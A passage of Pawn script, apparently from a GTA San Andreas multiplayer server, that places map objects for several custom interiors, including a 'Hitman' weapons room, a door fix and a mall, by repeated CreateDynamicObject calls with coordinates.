	CreateDynamicObject(8133, 208.60, 141.42, 2013.00,   0.00, 90.00, 180.00, .interiorid = 73);
	CreateDynamicObject(637, 196.63, 131.45, 1997.03,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(860, 196.75, 132.35, 1997.27,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(860, 196.68, 130.50, 1997.27,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(861, 196.66, 131.45, 1997.20,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(3660, 208.64, 134.32, 1998.99,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(3660, 208.65, 153.92, 1998.99,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 200.61, 150.34, 1996.80,   0.00, 0.00, 265.00, .interiorid = 73);
	CreateDynamicObject(2356, 200.63, 147.43, 1996.80,   0.00, 0.00, 287.00, .interiorid = 73);
	CreateDynamicObject(2356, 200.10, 143.63, 1996.80,   0.00, 0.00, 229.00, .interiorid = 73);
	CreateDynamicObject(950, 186.46, 123.30, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(950, 191.70, 123.31, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(950, 181.10, 123.31, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(950, 175.87, 123.29, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2252, 199.55, 141.45, 1997.71,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2252, 201.91, 145.19, 1997.71,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2252, 202.09, 151.59, 1997.71,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2190, 200.38, 141.99, 1997.40,   0.00, 0.00, 193.00, .interiorid = 73);
	CreateDynamicObject(2190, 202.09, 147.77, 1997.40,   0.00, 0.00, -91.00, .interiorid = 73);
	CreateDynamicObject(2190, 202.07, 150.05, 1997.40,   0.00, 0.00, -91.00, .interiorid = 73);
	CreateDynamicObject(1533, 208.12, 121.16, 1996.86,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1533, 206.63, 121.16, 1996.86,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.49, 128.82, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.49, 128.20, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.50, 127.58, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.49, 126.97, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.47, 126.34, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.44, 125.08, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.45, 124.50, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.46, 123.93, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.47, 123.34, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14397, 201.89, 161.46, 2000.14,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14397, 201.89, 161.46, 2000.63,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(3117, 201.29, 142.76, 2002.69,   0.00, 90.00, 149.00, .interiorid = 73);
	CreateDynamicObject(2690, 201.43, 142.68, 2001.29,   0.00, 90.00, 55.00, .interiorid = 73);

	// Hitman interior
	CreateDynamicObject(14390, 1249.41, -775.23, 5083.00,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(14597, 1233.17, -751.84, 5081.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2395, 1246.36, -755.39, 5082.07,   0.00, 90.00, 90.00, .interiorid = 42);
	CreateDynamicObject(5056, 1246.25, -751.18, 5079.65,   0.00, 90.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1557, 1275.37, -760.01, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1557, 1278.39, -760.02, 5079.75,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(14399, 1257.84, -756.54, 5079.72,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2051, 1239.18, -738.26, 5082.22,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2051, 1241.72, -738.28, 5082.22,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2050, 1240.47, -738.27, 5082.10,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(18051, 1243.84, -739.91, 5081.25,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(14397, 1252.44, -743.42, 5081.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(941, 1238.20, -747.91, 5080.19,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2041, 1239.44, -748.19, 5080.85,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2041, 1239.22, -748.19, 5080.85,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(348, 1238.59, -747.54, 5080.66,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(348, 1238.97, -747.50, 5080.66,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(352, 1237.44, -748.13, 5080.67,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2509, 1243.02, -765.45, 5081.59,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2509, 1241.14, -765.44, 5081.59,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2509, 1239.28, -765.44, 5081.59,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(352, 1238.59, -765.42, 5081.92,   0.00, 5.00, 1.00, .interiorid = 42);
	CreateDynamicObject(352, 1238.59, -765.42, 5081.44,   0.00, 5.00, 1.00, .interiorid = 42);
	CreateDynamicObject(356, 1239.29, -765.45, 5081.84,   0.00, 0.00, 8.00, .interiorid = 42);
	CreateDynamicObject(356, 1239.29, -765.45, 5081.38,   0.00, 0.00, 8.00, .interiorid = 42);
	CreateDynamicObject(355, 1240.87, -765.44, 5081.91,   0.00, 5.00, 5.00, .interiorid = 42);
	CreateDynamicObject(355, 1240.87, -765.44, 5081.45,   0.00, 5.00, 5.00, .interiorid = 42);
	CreateDynamicObject(351, 1242.02, -765.42, 5081.89,   0.00, 10.00, 3.00, .interiorid = 42);
	CreateDynamicObject(351, 1242.02, -765.42, 5081.42,   0.00, 10.00, 3.00, .interiorid = 42);
	CreateDynamicObject(358, 1243.56, -765.38, 5081.30,   -5.00, -40.00, 180.00, .interiorid = 42);
	CreateDynamicObject(3015, 1243.93, -765.21, 5079.83,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3015, 1243.47, -765.22, 5079.83,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(941, 1243.81, -762.82, 5080.16,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(941, 1243.80, -760.36, 5080.16,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.86, -758.95, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.87, -759.23, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.89, -759.54, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.89, -759.85, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(364, 1243.28, -759.35, 5080.62,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(342, 1244.01, -760.72, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(342, 1243.83, -760.72, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(342, 1243.69, -760.73, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(342, 1243.55, -760.74, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(347, 1243.43, -761.88, 5080.70,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(347, 1243.42, -762.60, 5080.70,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(2043, 1244.12, -761.88, 5080.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2043, 1244.11, -762.62, 5080.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.18, -760.90, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.16, -760.22, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.17, -759.56, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.18, -758.90, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.15, -759.58, 5080.05,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.15, -760.30, 5080.05,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(942, 1232.92, -764.60, 5081.91,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.09, -761.58, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.15, -760.43, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.15, -759.28, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.19, -759.66, 5080.76,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.13, -760.89, 5080.76,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3793, 1229.77, -760.39, 5080.77,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(3788, 1229.99, -760.36, 5080.24,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(359, 1229.99, -760.15, 5080.22,   270.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(359, 1230.29, -760.16, 5080.22,   270.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2207, 1231.98, -742.15, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1714, 1233.03, -739.87, 5079.72,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1663, 1232.14, -743.12, 5080.17,   0.00, 0.00, 160.00, .interiorid = 42);
	CreateDynamicObject(1663, 1231.21, -742.56, 5080.17,   0.00, 0.00, 140.00, .interiorid = 42);
	CreateDynamicObject(1663, 1233.38, -743.18, 5080.17,   0.00, 0.00, 190.00, .interiorid = 42);
	CreateDynamicObject(1663, 1234.41, -742.64, 5080.17,   0.00, 0.00, 210.00, .interiorid = 42);
	CreateDynamicObject(18044, 1226.95, -762.62, 5081.44,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(18052, 1244.05, -761.95, 5082.21,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(11353, 1233.08, -737.75, 5079.75,   90.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(1736, 1233.00, -738.63, 5082.97,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2163, 1234.32, -737.90, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2163, 1232.56, -737.91, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2163, 1230.80, -737.90, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1233.18, -742.43, 5080.55,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1232.06, -742.18, 5080.55,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1232.34, -741.41, 5080.55,   0.00, 0.00, 55.00, .interiorid = 42);
	CreateDynamicObject(2894, 1233.51, -741.73, 5080.52,   0.00, 0.00, 207.00, .interiorid = 42);
	CreateDynamicObject(14455, 1236.64, -743.26, 5081.37,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(14455, 1236.65, -747.57, 5081.37,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(14455, 1229.36, -739.01, 5081.41,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(14455, 1229.36, -743.34, 5081.41,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(2737, 1223.06, -748.98, 5082.15,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2737, 1222.65, -754.68, 5082.15,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2737, 1226.06, -754.67, 5082.15,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(7294, 1226.08, -749.01, 5076.88,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(7294, 1220.08, -751.91, 5076.60,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(2953, 1233.43, -741.36, 5080.54,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1727, 1269.49, -754.55, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1726, 1271.47, -754.57, 5079.91,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1727, 1265.94, -757.02, 5079.88,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(1726, 1266.67, -754.61, 5079.91,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1651, 1270.53, -757.70, 5082.56,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2229, 1271.95, -758.16, 5080.96,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2229, 1269.05, -758.13, 5081.58,   0.00, 270.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2233, 1265.93, -758.23, 5079.90,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2233, 1266.68, -753.86, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2233, 1269.53, -753.79, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2233, 1271.39, -753.79, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2233, 1274.45, -753.90, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.37, -763.38, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.56, -763.38, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.73, -763.38, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.95, -763.39, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1263.06, -749.78, 5079.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1263.08, -755.89, 5079.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1273.10, -757.39, 5079.89,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1246.76, -749.64, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1246.67, -753.53, 5079.69,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2252, 1257.67, -754.83, 5081.39,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2252, 1258.00, -758.88, 5081.39,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2252, 1252.36, -754.62, 5081.39,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2257, 1267.86, -748.62, 5082.48,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3806, 1262.76, -753.09, 5083.84,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1249.39, -759.21, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1248.43, -759.25, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1247.09, -759.28, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1246.50, -758.11, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1246.50, -758.11, 5081.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1247.72, -759.30, 5081.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1249.20, -759.27, 5081.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1249.20, -759.27, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1248.33, -759.27, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1247.04, -759.32, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1246.54, -757.68, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1248.94, -759.27, 5082.24,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1247.92, -759.24, 5082.24,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1246.54, -758.36, 5082.24,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1246.54, -758.36, 5081.67,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1248.01, -759.28, 5081.67,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1248.01, -759.28, 5081.12,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1246.58, -758.48, 5081.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1248.66, -759.23, 5082.41,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1247.44, -759.27, 5082.41,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.48, -757.93, 5082.41,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.48, -757.93, 5081.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.48, -757.93, 5081.20,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1247.50, -759.35, 5081.20,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1247.29, -759.32, 5081.81,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.83, -759.23, 5081.81,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1250.68, -754.33, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1251.71, -754.35, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1253.47, -754.34, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1254.49, -754.26, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1255.60, -754.30, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1256.73, -754.28, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1541, 1247.90, -755.23, 5081.29,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1541, 1248.80, -755.23, 5081.29,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1548, 1248.31, -754.75, 5081.09,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1547, 1249.64, -754.72, 5081.09,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2125, 1256.23, -753.59, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2125, 1254.90, -753.63, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2125, 1253.67, -753.62, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2125, 1251.27, -753.63, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2125, 1250.37, -753.55, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2271, 1251.02, -749.09, 5082.93,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2270, 1254.56, -749.09, 5082.94,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1246.53, -758.92, 5082.21,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1246.52, -757.55, 5081.60,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1248.93, -759.31, 5081.60,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1248.72, -759.29, 5081.60,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1248.72, -759.29, 5081.03,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1249.02, -759.28, 5081.03,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1246.56, -758.95, 5081.03,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3806, 1261.99, -753.12, 5083.84,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2051, 1243.20, -738.25, 5082.22,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2050, 1238.27, -738.28, 5082.10,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2208, 1223.33, -751.86, 5079.76,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(367, 1226.13, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(367, 1225.75, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(367, 1225.36, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(369, 1224.43, -751.85, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(369, 1224.23, -751.85, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(369, 1224.01, -751.83, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(367, 1223.42, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(18766, 1279.89, -760.49, 5081.79,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2847, 1276.39, -759.68, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3462, 1278.68, -750.33, 5081.26,   0.00, 0.00, 47.00, .interiorid = 42);
	CreateDynamicObject(18652, 1279.88, -750.04, 5079.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(18652, 1278.83, -749.02, 5079.78,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2258, 1274.97, -755.53, 5081.91,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(1892, 1278.68, -759.08, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1892, 1274.09, -759.06, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(644, 1273.94, -749.60, 5079.91,   0.00, 0.00, 0.00, .interiorid = 42);

	// Door fix for Denise's house and covered pilot area for Shamal interior
	CreateDynamicObject(1498,2401.75927734,-1714.56994629,13.13000011,0.00000000,0.00000000,0.00000000); //object(gen_doorext03) (1)
	CreateDynamicObject(2634,1.74394608,31.97999954,1199.72998047,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(ab_vaultdoor) (3)
	CreateDynamicObject(2634,1.74316406,31.97949219,1202.69995117,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(ab_vaultdoor) (4)

	// Mall Interior
	CreateDynamicObject(3989,455.68774400,-2404.30932600,5.33563600,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(7493,523.24963400,-2413.61035200,13.25608600,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,419.32476800,-2425.11035200,13.25608600,0.00000000,0.00000000,180.48182006, .interiorid = 18);
	CreateDynamicObject(7493,489.72479200,-2484.48779300,13.25608600,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,487.52450600,-2329.01171900,13.25608600,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,489.69986000,-2484.63720700,16.78107800,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,487.59942600,-2328.79052700,17.20606800,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1560,474.51272600,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,476.01260400,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,477.48742700,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,478.98742700,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,486.41214000,-2377.77294900,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,484.91226200,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,483.38751200,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,481.86264000,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(3530,481.18234300,-2376.96899400,15.60875100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(3530,481.15734900,-2377.16821300,20.78376000,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(994,480.82080100,-2390.36132800,9.89794700,0.00000000,0.00000000,88.52197935, .interiorid = 18);
	CreateDynamicObject(1984,478.56616200,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,475.49148600,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,472.39157100,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,469.24166900,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,466.06658900,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,462.91674800,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,459.76684600,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,456.71698000,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1663,479.69928000,-2386.61132800,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1663,476.47433500,-2386.66113300,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1663,473.39917000,-2386.63623000,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1663,470.32437100,-2386.63623000,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1843,487.57012900,-2392.18725600,9.78098000,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1843,487.62011700,-2395.16137700,9.78098000,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1843,487.77008100,-2401.03686500,9.78098000,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1844,487.70239300,-2398.10913100,9.78064700,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1844,487.90234400,-2408.15502900,9.78064700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1844,487.92733800,-2411.10522500,9.78064700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1887,487.97479200,-2414.06201200,9.78038000,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1887,488.07476800,-2419.93847700,9.78038000,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1843,488.04068000,-2416.99829100,9.78043200,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
